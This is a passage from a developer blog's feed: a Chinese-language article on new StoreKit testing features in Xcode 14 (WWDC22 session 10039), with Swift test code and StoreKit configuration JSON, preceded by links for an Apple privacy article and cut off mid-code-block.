WWDC20 - Videos - Apple Developer</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2022/10023">What’s new in the Photos picker - WWDC22 - Videos - Apple Developer</a></li><li><a href="https://developer.apple.com/documentation/photokit/selecting_photos_and_videos_in_ios">Selecting Photos and Videos in iOS | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2022/10038/">What’s new with SKAdNetwork - WWDC22 - Videos - Apple Developer</a></li><li><a href="https://developer.apple.com/documentation/storekit/skadnetwork">SKAdNetwork | Apple Developer Documentation</a></li><li><a href="https://developer.apple.com/app-store/ad-attribution/">Ad Attribution - App Store - Apple Developer</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2022/10044/">Discover Benchmarks in App Analytics - WWDC22 - Videos - Apple Developer</a></li><li><a href="https://www.apple.com/privacy/docs/Differential_Privacy_Overview.pdf">Differential Privacy Overview - Apple</a></li><li><a href="https://machinelearning.apple.com/updates/ppml-workshop-2022">Apple Privacy-Preserving Machine Learning Workshop 2022 - Apple Machine Learning Research</a></li><li><a href="https://machinelearning.apple.com/research/learning-with-privacy-at-scale">Learning with Privacy at Scale - Apple Machine Learning Research</a></li><li><a href="https://www.youtube.com/watch?v=gI0wk1CXlsQ">Differential Privacy - Simply Explained - YouTube</a></li><li><a href="https://juejin.cn/post/7020201677072367623">iOS15 安全漏洞分析：价值10万美元的漏洞曝光 - 掘金</a></li><li><a href="https://www.apple.com.cn/privacy/control/">隐私 - 管控 - Apple (中国大陆)</a></li><li><a href="https://www.apple.com/privacy/docs/Building_a_Trusted_Ecosystem_for_Millions_of_Apps_A_Threat_Analysis_of_Sideloading.pdf">Building_a_Trusted_Ecosystem_for_Millions_of_Apps_A_Threat_Analysis_of_Sideloading.pdf</a></li><li><a href="https://www.apple.com.cn/privacy/docs/A_Day_in_the_Life_of_Your_Data.pdf">A_Day_in_the_Life_of_Your_Data.pdf</a></li><li><a href="https://support.apple.com/zh-cn/HT202491">在 Mac 上安全地打开 App - Apple 支持 (中国)</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2022/10092">Meet passkeys - WWDC22 - Videos - Apple Developer</a></li><li><a href="https://xiaozhuanlan.com/topic/8042173596">【WWDC22 10092】遇见 Passkey － 小专栏</a></li><li><a href="https://developer.apple.com/videos/play/wwdc2022/10077/">Replace CAPTCHAs with Private Access Tokens - WWDC22 - Videos - Apple Developer</a></li><li><a href="https://xiaozhuanlan.com/topic/6437105829">【WWDC22 10077】验证码的替代者—私有访问凭证 － 小专栏</a></li><li><a href="https://developer.apple.com/cn/news/?id=12m75xbj">帐户删除要求将从 6 月 30 日起生效 - Apple Developer</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文首发于 &lt;a href=&quot;https://juejin.cn/post/7116331493659508744&quot;&gt;WWDC22 - Apple 隐私技术探索 - 掘金&lt;/a&gt;，欢迎关注我们 &lt;a href=&quot;https://juejin.cn/user/1002387318511214&quot;&gt;@37手游iOS技术运营团队&lt;/a&gt; 。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;作者：iHTCboy&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;一直以来，苹果对隐私保护都非常严格，虽然每年新 iPhone 发布前已经被暴光的，但从 2018 年 Facebook 隐私门开始，不管国内还是海外，行业巨头还是个人用户，大家对于隐私的关注都达到了新的高度。正如乔布斯说，开放和安全是截然相反的事情，但这件不容易的事，总需要有人做。从 WWDC20 开始，对用户隐私的保护，又达到了史前的疯狂程度，如推出 ATT（App Tracking Transparency），成为广告行业的敌人，更不要说平时对权限的严控，所以，本文带大家一起回顾苹果关于隐私的升级变化。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="technology" scheme="https://ihtcboy.com/categories/technology/"/>
    
    
    <category term="WWDC22" scheme="https://ihtcboy.com/tags/WWDC22/"/>
    
    <category term="Apple Privacy" scheme="https://ihtcboy.com/tags/Apple-Privacy/"/>
    
    <category term="苹果隐私保护技术" scheme="https://ihtcboy.com/tags/%E8%8B%B9%E6%9E%9C%E9%9A%90%E7%A7%81%E4%BF%9D%E6%8A%A4%E6%8A%80%E6%9C%AF/"/>
    
  </entry>
  
  <entry>
    <title>WWDC22 10039 - Xcode StoreKit 测试的新功能</title>
    <link href="https://ihtcboy.com/2022/06/24/2022-06-24_WWDC22_StoreKit_Test/"/>
    <id>https://ihtcboy.com/2022/06/24/2022-06-24_WWDC22_StoreKit_Test/</id>
    <published>2022-06-24T15:14:10.000Z</published>
    <updated>2022-12-31T15:07:15.876Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文是《WWDC22 内参》参与创作者，首发于 <a href="https://xiaozhuanlan.com/topic/5842093617">【WWDC22 10039】Xcode StoreKit 测试的新功能 － 小专栏</a>。</p></blockquote><p>基于 <a href="https://developer.apple.com/videos/play/wwdc2022/10039/">Session 10039</a> 梳理</p><blockquote><p>作者：iHTCboy，目前就职于三七互娱37手游，从事游戏 SDK 开发多年，对 IAP 和 SDK 架构设计有丰富的实践经验。</p><p>审核：<br>黄骋志（橙汁），老司机技术社区核心成员，现于西瓜视频负责稳定性 OOM/Watchdog 相关工作。</p><p>SeaHub，目前任职于腾讯 TEG 计费平台部，负责搭建服务于腾讯系业务的支付组件 SDK，对 IAP 相关内容及 SDK 设计开发有一定的经验。</p><p>王浙剑（Damonwong），老司机技术社区负责人、WWDC22 内参主理人，目前就职于阿里巴巴。</p></blockquote><span id="more"></span><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-00.png" alt="WWDC22-Xcode-StoreKit-Testing-00"></p><h2 id="1、前言"><a href="#1、前言" class="headerlink" title="1、前言"></a>1、前言</h2><p>在 Xcode 12 之前，App 内购买项目是不能在 Xcode 模拟器中进行购买，只能使用真机进行测试内购充值，因为模拟器无法连接到 App Store 服务器进行交易。苹果在 WWDC20 推出了 <a href="https://developer.apple.com/videos/play/wwdc2020/10659">StoreKit Testing</a>，通过 Xcode 12 创建 StoreKit 配置文件和搭建本地测试环境，实现本地 App 内购买和验证收据等测试流程，而无需依赖 App Store 服务器。而今年的 WDC22 苹果对 StoreKit 测试流程改进完善，包含 Xcode 14 中测试功能的优化，支持订阅商品更多场景的测试，还有 StoreKit 配置文件通过 App Store Connect 自动同步等等。</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-01.png" alt="WWDC22-Xcode-StoreKit-Testing-01"></p><h2 id="2、回顾-StoreKit-Testing-功能"><a href="#2、回顾-StoreKit-Testing-功能" class="headerlink" title="2、回顾 StoreKit Testing 功能"></a>2、回顾 StoreKit Testing 功能</h2><h3 id="2-1-StoreKit-App-内购买的测试方式"><a href="#2-1-StoreKit-App-内购买的测试方式" class="headerlink" title="2.1 StoreKit App 内购买的测试方式"></a>2.1 StoreKit App 内购买的测试方式</h3><p>在讲解 StoreKit 测试的新功能之前，小编先带大家回顾一下 StoreKit 测试的历史流程，这样我们才能理解这个新功能的改进的意义。在苹果文档 <a href="https://developer.apple.com/documentation/storekit/in-app_purchase/original_api_for_in-app_purchase">Original API for In-App Purchase</a> 中有这样的一张图：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-02.png" alt="WWDC22-Xcode-StoreKit-Testing-02"></p><p>从这张图可以看出 StoreKit API 的测试必须依赖四方：</p><ul><li>开发者 app</li><li>开发者服务器</li><li>StoreKit</li><li>App Store 服务器</li></ul><p>这样互相循环依赖的关系，导致开发者需要测试 StoreKit 功能就非常的被动，<strong>主要的问题是依赖 App Store 服务器</strong>，一方面是 StoreKit 内购买需要通过 App Store 服务器创建交易（transaction），另一方面是开发者需要通过 App Store 服务器来校验票据（receipt）。而在 Xcode 和模拟器中，StoreKit 并不支持 App Store 服务器交互，导致无法完成流程的闭环。</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-03.png" alt="WWDC22-Xcode-StoreKit-Testing-03"></p><p>所以，要测试 App 内购买功能有以下三种测试环境：</p><ul><li><code>Production</code>：生产环境，也就是 App Store 下载的 app，需要使用真钱才能进行测试。</li><li><code>Sandbox</code>：沙盒环境，开发者用 Development 或 Ad Hoc 证书打包调试时， 在真机中可以进行 App 内购买测试，但需要登录沙盒测试账号。</li><li><code>TestFlight</code>：测试环境，面向外部测试员，App 内购买项目使用的是沙盒环境，但不需要测试员登录沙盒测试账号。</li></ul><h3 id="2-2-Xcode-中-StoreKit-Testing-功能"><a href="#2-2-Xcode-中-StoreKit-Testing-功能" class="headerlink" title="2.2 Xcode 中 StoreKit Testing 功能"></a>2.2 Xcode 中 StoreKit Testing 功能</h3><p>苹果在 WWDC20 推出了 <a href="https://developer.apple.com/videos/play/wwdc2020/10659">StoreKit Testing</a>，它的目的是脱离 App Store 服务器，让开发者本地就能完成 App 内购买流程。原理是，Xcode 中创建一个 <code>StoreKit Configuration File</code> 本地配置文件，Xcode 通过这个配置文件模拟 StoreKit 与 App Store 服务器的交互流程，从而实现在 Xcode 模拟器中发起 App 内购买操作。</p><p>具体的操作是在 Xcode 项目中新建文件，选择创建 <code>StoreKit Configuration File</code>，然后选中生成 <code>.storekit</code> 后缀的文件，点击左下角的 <code>+</code> 可以选择创建商品类型，根据需要填写要测试的商品信息。</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-04.png" alt="WWDC22-Xcode-StoreKit-Testing-04"></p><p>要启动 StoreKit Testing 功能，需要在项目的 <code>Edit Scheme</code> 中切换到 <code>Run</code> 栏中的 <code>Options</code> 标签，再在 <code>StoreKit Configuration</code> 中选中需要测试的 StoreKit 配置文件即可。然后运行项目后，在 Xcode 的调试栏中点击 <code>Manage StoreKit Transactions</code> 图标，可以打开订单交易管理界面，可以对交易的任一订单进行删除、退款、中断、同意或拒绝购买等操作。</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-05.png" alt="WWDC22-Xcode-StoreKit-Testing-05"></p><p>Xcode 本地创建和生成的交易订单的票据是使用单独的 RSA 密钥生成，使用 <code>PKCS7</code> 填充算法，公钥可以在 Xcode 的 <code>Editor</code> 菜单栏中 <code>Save Public Certificate</code> 导出。<br><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-06.png" alt="WWDC22-Xcode-StoreKit-Testing-06"></p><p>另外，苹果推出了 <a href="https://developer.apple.com/documentation/storekittest">StoreKitTest Framework</a> 用于在 Xcode 中编写单元测试和持续集成测试，以实现 StoreKit 自动化测试。简单的一个测试用例如下：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> XCTest</span><br><span class="line"><span class="keyword">import</span> StoreKitTest</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InAppPurchaseTests</span>: <span class="title">XCTestCase</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">let</span> store <span class="operator">=</span> <span class="type">Store</span>()</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">var</span> testSession: <span class="type">SKTestSession</span>!</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">func</span> <span class="title">testRecipeUnlock</span>()</span> <span class="keyword">throws</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> session <span class="operator">=</span> <span class="keyword">try</span> <span class="type">SKTestSession</span>(configurationFileNamed: <span class="string">&quot;NonConsumable&quot;</span>)</span><br><span class="line">        session.disableDialogs <span class="operator">=</span> <span class="literal">true</span></span><br><span class="line">        session.clearTransactions()</span><br><span class="line">        </span><br><span class="line">        buyProduct(<span class="type">Smoothie</span>.thatsBerryBananas.productID)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">let</span> contentAvailable <span class="operator">=</span> store.receiptContains(productIdentifier: <span class="type">Smoothie</span>.thatsBerryBananas.productID)</span><br><span class="line">        </span><br><span class="line">        <span class="type">XCTAssertTrue</span>(contentAvailable, <span class="string">&quot;Expected content for <span class="subst">\(Smoothie.thatsBerryBananas.productID)</span> is not available&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后，关于 WWDC20 <a href="https://developer.apple.com/videos/play/wwdc2020/10659">StoreKit Testing</a> 的详细介绍，可以参考我们之前的文章 <a href="https://xiaozhuanlan.com/topic/1950472863">WWDC20 - 介绍 Xcode 中的 StoreKit 测试</a>。</p><h2 id="3、Xcode-14-中-StoreKit-Testing-新功能"><a href="#3、Xcode-14-中-StoreKit-Testing-新功能" class="headerlink" title="3、Xcode 14 中 StoreKit Testing 新功能"></a>3、Xcode 14 中 StoreKit Testing 新功能</h2><p>目前 Xcode 中 StoreKit 测试新流程如下图：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-07.png" alt="WWDC22-Xcode-StoreKit-Testing-07"></p><p>开发者可以串联 Xcode、App Store Connect、TestFlight、App Store 实现完整的流程，StoreKit 在沙盒和 Xcode 中的测试。</p><h3 id="3-1-支持-StoreKit-的配置文件从-App-Store-Connect-同步"><a href="#3-1-支持-StoreKit-的配置文件从-App-Store-Connect-同步" class="headerlink" title="3.1 支持 StoreKit 的配置文件从 App Store Connect 同步"></a>3.1 支持 StoreKit 的配置文件从 App Store Connect 同步</h3><p>我们上面讲到的 StoreKit Configuration 文件的创建和配置，其实是比较麻烦的，因为开发者在 App Store Connect 创建 App 之后需要创建配置 App 内购买商品，然后在 Xcode 中创建 StoreKit Configuration 文件后，还需要把全部的商品信息再配置一次，对于开发者来说是非常麻烦的重复事情。</p><p>在 Xcode 14 中，苹果解决了 StoreKit Configuration 文件需要手动配置的商品的问题，开发者在创建时 StoreKit Configuration 文件时，可以选择勾选 <code>Sync this file with an app in App Store Connect</code>，然后选择开发者团队和 App ，就可以从 AppStore Connect 拉取已经填好参数的配置文件，同时配置文件也可以进行更新，具体看下文介绍。<br><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-08.png" alt="WWDC22-Xcode-StoreKit-Testing-08"></p><blockquote><p>这里选择的 App 主要目的是确认同步那个 App 的商品信息，不需要与当前项目的 App（Bundle ID）一致，也能同步商品信息下来。</p></blockquote><p>App Store Connect 同步的 StoreKit Configuration 文件，只能点击刷新按钮同步最新的商品更新信息，而不能在 Xcode 中修改。如果需要本地修改，可以选择配置文件后，点击 Xcode 的 <code>Editor</code> 菜单栏中 <code>Convert to Local StoreKit Configuration</code> 转换成本地配置文件，转换成功后将不能在从 App Store Connect 中同步了。</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-09.png" alt="WWDC22-Xcode-StoreKit-Testing-09"></p><p>如果转换成本地配置文件，Xcode 会有一个警告提醒，点击 <code>Conver File</code> 才能转换成功。另外，如果不想转换，可以点击某个商品的配置，然后复制粘贴到其它的本地配置文件中，这里就不在赘述。</p><p><strong>同步文件的区别</strong></p><p>其实 StoreKit Configuration 是一个 <code>json</code> 格式的配置文件。</p><p>未勾选同步时，创建的 StoreKit 配置文件内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;identifier&quot;</span> : <span class="string">&quot;EDA3AE34&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;nonRenewingSubscriptions&quot;</span> : [</span><br><span class="line"></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;products&quot;</span> : [</span><br><span class="line"></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;settings&quot;</span> : &#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;subscriptionGroups&quot;</span> : [</span><br><span class="line"></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;version&quot;</span> : &#123;</span><br><span class="line">    <span class="attr">&quot;major&quot;</span> : <span class="number">2</span>,</span><br><span class="line">    <span class="attr">&quot;minor&quot;</span> : <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>创建同步的 StoreKit 配置文件（未点击同步前）的内容：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;identifier&quot;</span> : <span class="string">&quot;9F120B79&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;nonRenewingSubscriptions&quot;</span> : [</span><br><span class="line"></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;products&quot;</span> : [</span><br><span class="line"></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;settings&quot;</span> : &#123;</span><br><span class="line">    <span class="attr">&quot;_applicationInternalID&quot;</span> : <span class="string">&quot;914453386&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;_developerTeamID&quot;</span> : <span class="string">&quot;28PV6G9666&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;subscriptionGroups&quot;</span> : [</span><br><span class="line"></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;version&quot;</span> : &#123;</span><br><span class="line">    <span class="attr">&quot;major&quot;</span> : <span class="number">2</span>,</span><br><span class="line">    <span class="attr">&quot;minor&quot;</span> : <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>从内容上可以猜到，<code>identifier</code> 表示配置文件的唯一标识，<code>_applicationInternalID</code> 表示 <code>app id</code>，而 <code>_developerTeamID</code> 表示开发者的团队唯一标识。</p></blockquote><p>苹果是用 <code>settings</code> 字段里的 <code>_applicationInternalID</code> 和 <code>_developerTeamID</code> 这两个键值共同来判断是本地的还是同步的配置文件：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;settings&quot;</span> : &#123;</span><br><span class="line">   <span class="attr">&quot;_applicationInternalID&quot;</span> : <span class="string">&quot;914453386&quot;</span>,</span><br><span class="line">   <span class="attr">&quot;_developerTeamID&quot;</span> : <span class="string">&quot;28PV6G9666&quot;</span></span><br><span class="line"> &#125;,</span><br></pre></td></tr></table></figure><p>直接修改本地的配置文件，可以实现同步 AppStore Connect 的配置。但是需要注意，本地配置的商品信息会被删除，覆盖来 AppStore Connect 配置的商品信息。</p><p>一个同步后的 StoreKit 配置文件的内容示例：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;identifier&quot;</span> : <span class="string">&quot;02ECE2F0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;nonRenewingSubscriptions&quot;</span> : [</span><br><span class="line"></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;products&quot;</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;displayPrice&quot;</span> : <span class="string">&quot;0.99&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;familyShareable&quot;</span> : <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;internalID&quot;</span> : <span class="string">&quot;1545378276&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;localizations&quot;</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;description&quot;</span> : <span class="string">&quot;加餐：给开发者打赏一个鸡腿&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;displayName&quot;</span> : <span class="string">&quot;1个鸡腿&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;locale&quot;</span> : <span class="string">&quot;zh_CN&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;productID&quot;</span> : <span class="string">&quot;com.iHTCboy.chicken&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;referenceName&quot;</span> : <span class="string">&quot;一个鸡腿&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span> : <span class="string">&quot;Consumable&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;displayPrice&quot;</span> : <span class="string">&quot;1.99&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;familyShareable&quot;</span> : <span class="literal">false</span>,</span><br><span class="line">      <span class="attr">&quot;internalID&quot;</span> : <span class="string">&quot;1545827693&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;localizations&quot;</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;description&quot;</span> : <span class="string">&quot;加餐：给开发者打赏一杯咖啡&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;displayName&quot;</span> : <span class="string">&quot;一杯咖啡&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;locale&quot;</span> : <span class="string">&quot;zh_CN&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;productID&quot;</span> : <span class="string">&quot;com.iHTCboy.coffee&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;referenceName&quot;</span> : <span class="string">&quot;一杯咖啡&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;type&quot;</span> : <span class="string">&quot;Consumable&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;settings&quot;</span> : &#123;</span><br><span class="line">    <span class="attr">&quot;_applicationInternalID&quot;</span> : <span class="string">&quot;914453386&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;_developerTeamID&quot;</span> : <span class="string">&quot;28PV6G9666&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;_lastSynchronizedDate&quot;</span> : <span class="number">679737877.04214501</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;subscriptionGroups&quot;</span> : [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="attr">&quot;id&quot;</span> : <span class="string">&quot;20919269&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;localizations&quot;</span> : [</span><br><span class="line"></span><br><span class="line">      ],</span><br><span class="line">      <span class="attr">&quot;name&quot;</span> : <span class="string">&quot;VIP&quot;</span>,</span><br><span class="line">      <span class="attr">&quot;subscriptions&quot;</span> : [</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;adHocOffers&quot;</span> : [</span><br><span class="line"></span><br><span class="line">          ],</span><br><span class="line">          <span class="attr">&quot;codeOffers&quot;</span> : [</span><br><span class="line"></span><br><span class="line">          ],</span><br><span class="line">          <span class="attr">&quot;displayPrice&quot;</span> : <span class="string">&quot;1.99&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;familyShareable&quot;</span> : <span class="literal">false</span>,</span><br><span class="line">          <span class="attr">&quot;groupNumber&quot;</span> : <span class="number">1</span>,</span><br><span class="line">          <span class="attr">&quot;internalID&quot;</span> : <span class="string">&quot;1606645471&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;introductoryOffer&quot;</span> : <span class="literal">null</span>,</span><br><span class="line">          <span class="attr">&quot;localizations&quot;</span> : [</span><br><span class="line"></span><br><span class="line">          ],</span><br><span class="line">          <span class="attr">&quot;productID&quot;</span> : <span class="string">&quot;com.iHTCboy.month&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;recurringSubscriptionPeriod&quot;</span> : <span class="string">&quot;P1M&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;referenceName&quot;</span> : <span class="string">&quot;高级月卡&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;subscriptionGroupID&quot;</span> : <span class="string">&quot;20919269&quot;</span>,</span><br><span class="line">          <span class="attr">&quot;type&quot;</span> : <span class="string">&quot;RecurringSubscription&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      ]</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">&quot;version&quot;</span> : &#123;</span><br><span class="line">    <span class="attr">&quot;major&quot;</span> : <span class="number">2</span>,</span><br><span class="line">    <span class="attr">&quot;minor&quot;</span> : <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同步的 StoreKit 配置文件与不同步的 StoreKit 配置文件的商品内容格式是一样的，这里就不在赘述。</p><h3 id="3-2-本地订单交易管理器（the-transaction-manager）"><a href="#3-2-本地订单交易管理器（the-transaction-manager）" class="headerlink" title="3.2 本地订单交易管理器（the transaction manager）"></a>3.2 本地订单交易管理器（the transaction manager）</h3><p>之前的 Xcode 订单交易管理界面，可以对交易的任一订单进行删除、退款、中断、同意或拒绝购买等操作。</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-10.png" alt="WWDC22-Xcode-StoreKit-Testing-10"></p><p>Xcode 14 中，点击某个交易订单，可以看到右侧栏会显示商品的交易详细信息，如果是订阅商品还包含订阅过期时间、续订时间等等。另外底部新增搜索栏，可以搜索商品的 ID 或交易时间等。</p><h2 id="4、StoreKit-Testing-的改进案例"><a href="#4、StoreKit-Testing-的改进案例" class="headerlink" title="4、StoreKit Testing 的改进案例"></a>4、StoreKit Testing 的改进案例</h2><p>那么如何结合 Xcode 进行 StoreKit 测试，如果之前大家没有尝试过，看看这几个案例就能大概学会啦。</p><ul><li>退款测试（Refund requests）</li><li>优惠代码测试（Offer codes）</li><li>订阅涨价测试（Price increases）</li><li>扣费重试和宽限期（Billing retry and grace period)</li></ul><h3 id="4-1-退款测试（Refund-requests）"><a href="#4-1-退款测试（Refund-requests）" class="headerlink" title="4.1 退款测试（Refund requests）"></a>4.1 退款测试（Refund requests）</h3><p>在 iOS 15 苹果提供了 app 里申请退款的接口：</p><p><img src="https://ihtcboy.com/images/WWDC22-Xcode-StoreKit-Testing-11.png" alt="WWDC22-Xcode-StoreKit-Testing-11"></p><p>在 SwiftUI 中使用 <a href="https://developer.apple.com/documentation/swiftui/view/refundrequestsheet(for:ispresented:ondismiss:)">refundRequestSheet(for:isPresented:onDismiss:)</a> 接口实现退款的示例：</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 